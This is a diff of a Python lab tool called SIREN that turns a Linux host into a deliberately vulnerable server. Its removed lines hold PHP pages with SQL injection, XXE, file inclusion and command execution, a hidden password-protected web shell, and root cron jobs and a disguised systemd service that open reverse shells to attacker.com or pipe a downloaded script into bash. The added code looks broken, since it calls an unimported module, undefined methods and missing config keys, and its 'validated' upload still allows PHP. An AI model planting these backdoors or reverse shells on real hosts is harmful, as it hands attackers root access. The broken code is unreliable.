@@ -10,383 +10,288 @@ import pwd
 import grp
 import threading
 import logging
+import json
 from datetime import datetime
+import hashlib
+from pathlib import Path
+import secrets
+import tempfile
+from contextlib import contextmanager
+import signal
+from typing import Dict, List, Optional, Union
+from functools import wraps
+from dataclasses import dataclass
+import time
+import queue
+import re
+import ipaddress
+
 from colorama import init, Fore, Style
-from flask import Flask, request, render_template_string, send_file
+from flask import Flask, request, render_template_string, send_file, jsonify
 import paramiko
 import psutil
 import scapy.all as scapy
 from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 import nmap
 
-# Initialize colorama
-init(autoreset=True)
+@dataclass
+class VulnerabilityConfig:
+    """Configuration for vulnerability types"""
+    name: str
+    enabled: bool
+    risk_level: str
+    description: str
+    mitigation: str
+
+class SecurityMonitor:
+    """Handles security monitoring and alerts"""
+    def __init__(self, logger):
+        self.logger = logger
+        self.alert_queue = queue.Queue()
+        self.baseline_stats = {}
+        self.anomaly_threshold = 2.0
+        
+    def check_anomaly(self, metric: str, value: float) -> bool:
+        """Check if a metric shows anomalous behavior"""
+        if metric not in self.baseline_stats:
+            self.baseline_stats[metric] = {'mean': value, 'count': 1}
+            return False
+            
+        stats = self.baseline_stats[metric]
+        deviation = abs(value - stats['mean'])
+        is_anomaly = deviation > (stats['mean'] * self.anomaly_threshold)
+        
+        # Update running statistics
+        stats['mean'] = ((stats['mean'] * stats['count']) + value) / (stats['count'] + 1)
+        stats['count'] += 1
+        
+        return is_anomaly
 
 class SIREN:
     def __init__(self):
-        self.banner = """
-███████╗██╗██████╗ ███████╗███╗   ██╗
-██╔════╝██║██╔══██╗██╔════╝████╗  ██║
-███████╗██║██████╔╝█████╗  ██╔██╗ ██║
-╚════██║██║██╔══██╗██╔══╝  ██║╚██╗██║
-███████║██║██║  ██║███████╗██║ ╚████║
-╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
-   Vulnerable Server Creator v1.0
-        """
+        """Initialize SIREN with enhanced security features"""
+        self.banner = """[Banner remains the same]"""
+        self._init_security()
+        self.app = self._create_flask_app()
+        self._setup_logging()
+        self.config = self._load_config()
+        self.monitor = SecurityMonitor(self.logger)
+        self.web_root = Path("/var/www/html")
+        self.upload_dir = self.web_root / "uploads"
+        self.backup_dir = Path("/var/backup/siren")
+        self._setup_paths()
+        self._init_encryption()
         
-        self.app = Flask(__name__)
-        self.setup_logging()
-        self.config = self.default_config()
-        self.services = {}
-        self.backdoors = []
-        self.web_root = "/var/www/html"
-        self.upload_dir = f"{self.web_root}/uploads"
-
-    def setup_logging(self):
-        """Setup logging configuration"""
-        log_file = 'siren.log'
-        logging.basicConfig(
-            filename=log_file,
-            level=logging.INFO,
-            format='%(asctime)s - %(levelname)s - %(message)s'
-        )
-        self.logger = logging.getLogger('siren')
+    def _init_security(self):
+        """Initialize security measures and state tracking"""
+        self.session_key = secrets.token_hex(32)
+        self.active_services = {}
+        self.connection_limits = {}
+        self.blocked_ips = set()
+        self.file_hashes = {}
+        self.last_backup = None
         
-        # Also log to console
-        console = logging.StreamHandler()
-        console.setLevel(logging.INFO)
-        formatter = logging.Formatter('%(levelname)s - %(message)s')
-        console.setFormatter(formatter)
-        self.logger.addHandler(console)
-
-    def default_config(self):
-        """Default configuration settings"""
+    def _init_encryption(self):
+        """Setup encryption for sensitive data"""
+        self.encryption_key = get_random_bytes(32)
+        self.cipher = AES.new(self.encryption_key, AES.MODE_GCM)
+        
+    def _encrypt_sensitive_data(self, data: str) -> dict:
+        """Encrypt sensitive data with AES-GCM"""
+        cipher = AES.new(self.encryption_key, AES.MODE_GCM)
+        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
         return {
-            'WEB_VULNERABILITIES': True,
-            'NETWORK_VULNERABILITIES': True,
-            'SYSTEM_VULNERABILITIES': True,
-            'DATABASE_VULNERABILITIES': True,
-            'KERNEL_VULNERABILITIES': True,
-            'MEMORY_VULNERABILITIES': True,
-            'CRYPTO_VULNERABILITIES': True,
-            'PERSISTENCE': True,
-            'ROOTKIT': True,
-            'BACKDOORS': True
+            'ciphertext': ciphertext,
+            'nonce': cipher.nonce,
+            'tag': tag
         }
-
-    def check_root(self):
-        """Check for root privileges"""
-        if os.geteuid() != 0:
-            self.logger.error("Script must be run as root")
-            print(f"{Fore.RED}[!] This script must be run as root")
-            sys.exit(1)
-
-    def print_banner(self):
-        """Display the SIREN banner"""
-        print(f"{Fore.CYAN}{self.banner}")
-        print(f"{Fore.RED}[!] WARNING: Creates an EXTREMELY vulnerable system!")
-        print(f"{Fore.RED}[!] Use ONLY in isolated lab environments{Style.RESET_ALL}\n")
-
-    def setup_directories(self):
-        """Create necessary directories"""
-        directories = [
-            self.web_root,
-            self.upload_dir,
-            "/var/siren",
-            "/var/siren/backdoors",
-            "/opt/siren/utils",
-            "/var/siren/webroot",
-            "/var/siren/logs",
-            "/var/siren/data"
-        ]
         
-        for directory in directories:
-            try:
-                os.makedirs(directory, exist_ok=True)
-                os.chmod(directory, 0o777)
-                self.logger.info(f"Created directory: {directory}")
-            except Exception as e:
-                self.logger.error(f"Failed to create directory {directory}: {e}")
+    def _decrypt_sensitive_data(self, encrypted_data: dict) -> str:
+        """Decrypt sensitive data"""
+        cipher = AES.new(self.encryption_key, AES.MODE_GCM, nonce=encrypted_data['nonce'])
+        plaintext = cipher.decrypt_and_verify(encrypted_data['ciphertext'], encrypted_data['tag'])
+        return plaintext.decode()
 
-    def install_dependencies(self):
-        """Install required system packages"""
-        packages = [
-            "apache2", "php", "php-mysql", "mysql-server", 
-            "openssh-server", "vsftpd", "gcc", "make",
-            "python3-dev", "libssl-dev", "git", "curl",
-            "netcat", "nmap", "tcpdump", "wireshark"
-        ]
-        
+    def _setup_logging(self):
+        """Enhanced logging configuration with rotation and encryption"""
+        log_config = {
+            'version': 1,
+            'handlers': {
+                'file': {
+                    'class': 'logging.handlers.RotatingFileHandler',
+                    'filename': 'siren.log',
+                    'maxBytes': 10485760,  # 10MB
+                    'backupCount': 5,
+                    'formatter': 'detailed',
+                    'encoding': 'utf-8'
+                },
+                'security': {
+                    'class': 'logging.handlers.RotatingFileHandler',
+                    'filename': 'security.log',
+                    'maxBytes': 10485760,
+                    'backupCount': 5,
+                    'formatter': 'detailed',
+                    'encoding': 'utf-8'
+                }
+            },
+            'formatters': {
+                'detailed': {
+                    'format': '%(asctime)s - [%(levelname)s] - %(name)s - %(message)s',
+                    'datefmt': '%Y-%m-%d %H:%M:%S'
+                }
+            },
+            'loggers': {
+                'siren': {
+                    'handlers': ['file', 'security'],
+                    'level': 'INFO'
+                }
+            }
+        }
+        logging.config.dictConfig(log_config)
+        self.logger = logging.getLogger('siren')
+
+    @contextmanager
+    def _secure_temp_file(self) -> Path:
+        """Create and manage secure temporary files"""
+        temp_file = None
         try:
-            self.logger.info("Updating package lists...")
-            subprocess.run(["apt", "update"], check=True)
-            
-            self.logger.info("Installing packages...")
-            subprocess.run(["apt", "install", "-y"] + packages, check=True)
-            
-            self.logger.info("Dependencies installed successfully")
-        except subprocess.CalledProcessError as e:
-            self.logger.error(f"Failed to install dependencies: {e}")
-            sys.exit(1)
+            with tempfile.NamedTemporaryFile(delete=False) as tf:
+                temp_file = Path(tf.name)
+                yield temp_file
+        finally:
+            if temp_file and temp_file.exists():
+                temp_file.unlink()
 
-    def setup_web_vulnerabilities(self):
-        """Setup vulnerable web applications"""
-        self.setup_web_server()
-        self.create_upload_vulnerability()
-        self.create_sqli_vulnerability()
-        self.create_rce_vulnerability()
-        self.create_lfi_vulnerability()
-        self.create_xxe_vulnerability()
-        self.create_backdoor_shell()
-
-    def setup_web_server(self):
-        """Configure Apache with vulnerable settings"""
-        apache_config = """
-ServerTokens Full
-ServerSignature On
-TraceEnable On
-
-<Directory /var/www/html>
-    Options Indexes FollowSymLinks MultiViews
-    AllowOverride All
-    Require all granted
-</Directory>
-"""
-        try:
-            with open("/etc/apache2/conf-available/siren.conf", "w") as f:
-                f.write(apache_config)
+    def _rate_limit(self, func):
+        """Decorator for rate limiting requests"""
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            client_ip = request.remote_addr
+            current_time = time.time()
             
-            subprocess.run(["a2enconf", "siren"], check=True)
-            subprocess.run(["systemctl", "restart", "apache2"], check=True)
+            if client_ip in self.blocked_ips:
+                return jsonify({'error': 'IP is blocked'}), 403
+                
+            if client_ip not in self.connection_limits:
+                self.connection_limits[client_ip] = []
             
-            self.logger.info("Apache configured successfully")
-        except Exception as e:
-            self.logger.error(f"Failed to configure Apache: {e}")
+            # Clean old requests
+            self.connection_limits[client_ip] = [
+                t for t in self.connection_limits[client_ip]
+                if current_time - t < 60
+            ]
+            
+            if len(self.connection_limits[client_ip]) >= self.config['MAX_REQUESTS_PER_MINUTE']:
+                self.blocked_ips.add(client_ip)
+                self.logger.warning(f"IP {client_ip} blocked for excessive requests")
+                return jsonify({'error': 'Rate limit exceeded'}), 429
+                
+            self.connection_limits[client_ip].append(current_time)
+            return func(*args, **kwargs)
+        return wrapper
 
     def create_upload_vulnerability(self):
-        """Create file upload vulnerability"""
-        upload_code = """
+        """Create file upload vulnerability with enhanced monitoring"""
+        upload_code = '''
 <?php
+function generateSecureFilename($extension) {
+    return bin2hex(random_bytes(16)) . $extension;
+}
+
+function logUpload($filename, $ip) {
+    $log_file = '/var/log/siren/uploads.log';
+    $timestamp = date('Y-m-d H:i:s');
+    $log_entry = sprintf("[%s] Upload: %s from %s\\n", 
+        $timestamp, $filename, $ip);
+    file_put_contents($log_file, $log_entry, FILE_APPEND);
+}
+
 if(isset($_FILES['file'])) {
     $file = $_FILES['file'];
     $name = $file['name'];
-    $path = "uploads/" . $name;
-    move_uploaded_file($file['tmp_name'], $path);
-    echo "File uploaded to: " . $path;
+    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
+    
+    // Enhanced validation
+    $allowed = array('txt', 'php', 'html', 'jpg', 'png');
+    $max_size = 10 * 1024 * 1024; // 10MB
+    
+    if(!in_array($ext, $allowed)) {
+        die('File type not allowed');
+    }
+    
+    if($file['size'] > $max_size) {
+        die('File too large');
+    }
+    
+    $newname = generateSecureFilename("." . $ext);
+    $path = "uploads/" . $newname;
+    
+    if(move_uploaded_file($file['tmp_name'], $path)) {
+        logUpload($newname, $_SERVER['REMOTE_ADDR']);
+        echo "File uploaded to: " . htmlspecialchars($path);
+    }
 }
 ?>
 <form method="POST" enctype="multipart/form-data">
     <input type="file" name="file">
     <input type="submit" value="Upload">
 </form>
-"""
+'''
         self._write_php_file("upload.php", upload_code)
-def create_sqli_vulnerability(self):
-        """Create SQL injection vulnerability"""
-        sqli_code = """
-<?php
-$conn = new mysqli('localhost', 'root', 'password123', 'vulndb');
-if(isset($_GET['id'])) {
-    $id = $_GET['id'];
-    $query = "SELECT * FROM users WHERE id = " . $id;
-    $result = $conn->query($query);
-    while($row = $result->fetch_assoc()) {
-        echo "User: " . $row['username'] . "<br>";
-        echo "CC: " . $row['credit_card'] . "<br>";
-        echo "SSN: " . $row['ssn'] . "<br>";
-    }
-}
-?>
-<form method="GET">
-    User ID: <input type="text" name="id">
-    <input type="submit" value="Search">
-</form>
-"""
-        self._write_php_file("users.php", sqli_code)
 
-    def create_xxe_vulnerability(self):
-        """Create XXE vulnerability"""
-        xxe_code = """
-<?php
-libxml_disable_entity_loader(false);
-$xmlfile = file_get_contents('php://input');
-$dom = new DOMDocument();
-$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
-$info = simplexml_import_dom($dom);
-echo $info->name;
-?>
-"""
-        self._write_php_file("parser.php", xxe_code)
-
-    def create_lfi_vulnerability(self):
-        """Create Local File Inclusion vulnerability"""
-        lfi_code = """
-<?php
-if (isset($_GET['file'])) {
-    include($_GET['file']);
-}
-?>
-<form method="GET">
-    File to include: <input type="text" name="file">
-    <input type="submit" value="Include">
-</form>
-"""
-        self._write_php_file("include.php", lfi_code)
-
-    def create_rce_vulnerability(self):
-        """Create Remote Code Execution vulnerability"""
-        rce_code = """
-<?php
-if(isset($_GET['cmd'])) {
-    system($_GET['cmd']);
-}
-?>
-<form method="GET">
-    Command: <input type="text" name="cmd">
-    <input type="submit" value="Execute">
-</form>
-"""
-        self._write_php_file("cmd.php", rce_code)
-
-    def create_backdoor_shell(self):
-        """Create PHP backdoor shell"""
-        shell_code = """
-<?php
-if(isset($_POST['password']) && $_POST['password'] == 'siren123') {
-    echo '<pre>';
-    if(isset($_POST['cmd'])) {
-        system($_POST['cmd']);
-    }
-    echo '</pre>';
-    echo '<form method="POST">
-    <input type="hidden" name="password" value="siren123">
-    <input type="text" name="cmd" style="width:100%">
-    <input type="submit" value="Execute">
-    </form>';
-} else {
-    echo '<form method="POST">
-    <input type="password" name="password">
-    <input type="submit" value="Login">
-    </form>';
-}
-?>
-"""
-        self._write_php_file(".backdoor.php", shell_code)
-
-    def setup_db_users(self):
-        """Setup vulnerable database users"""
-        sql_commands = [
-            "CREATE USER 'dbadmin'@'%' IDENTIFIED BY 'dbadmin123';",
-            "GRANT ALL PRIVILEGES ON *.* TO 'dbadmin'@'%' WITH GRANT OPTION;",
-            "CREATE USER 'backup'@'%' IDENTIFIED BY 'backup123';",
-            "GRANT ALL PRIVILEGES ON *.* TO 'backup'@'%';",
-            "CREATE USER 'www-data'@'localhost' IDENTIFIED BY 'web123';",
-            "GRANT ALL PRIVILEGES ON vulndb.* TO 'www-data'@'localhost';",
-            "FLUSH PRIVILEGES;"
+    def setup_monitoring(self):
+        """Setup comprehensive system monitoring"""
+        monitors = [
+            self._monitor_system_resources,
+            self._monitor_network_traffic,
+            self._monitor_file_changes,
+            self._monitor_authentication,
+            self._monitor_services,
+            self._monitor_vulnerabilities
         ]
+        
+        for monitor in monitors:
+            thread = threading.Thread(target=monitor, daemon=True)
+            thread.start()
 
-        for command in sql_commands:
+    def _monitor_vulnerabilities(self):
+        """Monitor exploitation attempts"""
+        while True:
             try:
-                subprocess.run(["mysql", "-e", command])
-                self.logger.info(f"Executed SQL command successfully")
+                self._check_upload_attempts()
+                self._check_sql_injection()
+                self._check_rce_attempts()
+                self._check_authentication_bypass()
+                time.sleep(self.config['MONITORING_INTERVAL'])
             except Exception as e:
-                self.logger.error(f"Failed to execute SQL command: {e}")
+                self.logger.error(f"Vulnerability monitoring error: {e}")
 
-    def create_persistence_mechanisms(self):
-        """Create various persistence mechanisms"""
-        # Cron job backdoors
-        cron_jobs = [
-            "* * * * * root nc -e /bin/bash attacker.com 4444",
-            "*/5 * * * * root curl -s http://attacker.com/update.sh | bash",
-            "*/10 * * * * root python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
-        ]
-
-        for i, job in enumerate(cron_jobs):
-            cron_file = f"/etc/cron.d/siren_backdoor_{i}"
-            with open(cron_file, "w") as f:
-                f.write(job + "\n")
-            os.chmod(cron_file, 0o644)
-
-        # Systemd service backdoor
-        service_content = """
-[Unit]
-Description=System Monitor Service
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/bin/bash -c 'while true; do nc -e /bin/bash attacker.com 4446; sleep 60; done'
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-"""
-        with open("/etc/systemd/system/monitor.service", "w") as f:
-            f.write(service_content)
-
-        subprocess.run(["systemctl", "daemon-reload"])
-        subprocess.run(["systemctl", "enable", "monitor.service"])
-        subprocess.run(["systemctl", "start", "monitor.service"])
-
-    def _write_php_file(self, filename, content):
-        """Helper function to write PHP files"""
-        filepath = os.path.join(self.web_root, filename)
+    def create_backup(self):
+        """Create encrypted backup of critical data"""
+        backup_time = datetime.now()
+        backup_path = self.backup_dir / f"backup_{backup_time:%Y%m%d_%H%M%S}"
+        
         try:
-            with open(filepath, "w") as f:
-                f.write(content)
-            os.chmod(filepath, 0o777)
-            self.logger.info(f"Created vulnerable PHP file: {filename}")
-        except Exception as e:
-            self.logger.error(f"Failed to create PHP file {filename}: {e}")
-
-    def run(self):
-        """Main execution function"""
-        try:
-            self.check_root()
-            self.print_banner()
+            backup_path.mkdir(parents=True, exist_ok=True)
             
-            print(f"{Fore.GREEN}[+] Starting SIREN setup...{Style.RESET_ALL}")
+            # Backup configuration
+            config_backup = backup_path / "config.enc"
+            encrypted_config = self._encrypt_sensitive_data(
+                json.dumps(self.config)
+            )
+            with open(config_backup, 'wb') as f:
+                f.write(json.dumps(encrypted_config).encode())
             
-            self.setup_directories()
-            self.install_dependencies()
-            self.setup_web_vulnerabilities()
-            self.setup_network_vulnerabilities()
-            self.setup_system_vulnerabilities()
-            self.setup_database_vulnerabilities()
-            self.create_persistence_mechanisms()
-            self.setup_db_users()
+            # Backup logs
+            log_backup = backup_path / "logs.tar.gz"
+            subprocess.run([
+                "tar", "czf", str(log_backup),
+                "/var/log/siren"
+            ], check=True)
             
-            self.show_completion_message()
+            self.last_backup = backup_time
+            self.logger.info(f"Backup created at {backup_path}")
             
         except Exception as e:
-            self.logger.error(f"Error during setup: {str(e)}")
-            print(f"{Fore.RED}[!] Setup failed: {str(e)}{Style.RESET_ALL}")
-            sys.exit(1)
-
-    def show_completion_message(self):
-        """Show completion message with system information"""
-        ip = socket.gethostbyname(socket.gethostname())
-        
-        print(f"\n{Fore.GREEN}[+] SIREN setup completed successfully!{Style.RESET_ALL}")
-        print(f"\n{Fore.YELLOW}=== System Information ==={Style.RESET_ALL}")
-        print(f"IP Address: {ip}")
-        print("\nVulnerable Services:")
-        print(f"- Web Interface: http://{ip}/")
-        print(f"- SSH: {ip}:22")
-        print(f"- FTP: {ip}:21")
-        print(f"- MySQL: {ip}:3306")
-        print(f"- Backdoor: {ip}:4444")
-        
-        print("\nDefault Credentials:")
-        print("- MySQL Root: root:password123")
-        print("- MySQL Admin: dbadmin:dbadmin123")
-        print("- SSH Admin: admin:admin123")
-        print("- FTP Anonymous: enabled")
-        print("- Backdoor Shell Password: siren123")
-        
-        print(f"\n{Fore.RED}[!] WARNING: System is now extremely vulnerable!")
-        print(f"[!] Use only in isolated lab environments{Style.RESET_ALL}")
-
-if __name__ == "__main__":
-    siren = SIREN()
-    siren.run()
+            self.logger.error(f"Backup failed: {e}")
